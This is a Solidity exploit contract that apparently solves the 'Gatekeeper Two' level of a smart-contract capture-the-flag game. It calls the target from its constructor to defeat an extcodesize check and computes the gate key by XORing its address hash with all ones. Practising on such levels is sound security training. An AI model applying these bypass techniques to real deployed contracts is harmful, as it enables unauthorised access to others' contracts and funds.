// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// ended up with openzeppelin solution because my solution was not as nice
// and turned out to be much too complicated for what we're doing.
// calculated the key by hand rather than just doing it in contract like this
// and this is much easier to redeploy and re-use.

interface GatekeeperTwoInterface {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateskipperTwo {

    GatekeeperTwoInterface gatekeeper;

    constructor(address GatekeeperTwoContractAddress) public {

        gatekeeper = GatekeeperTwoInterface(GatekeeperTwoContractAddress);

        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(-1));

        gatekeeper.enter{gas: 50000}(key);
    }
}
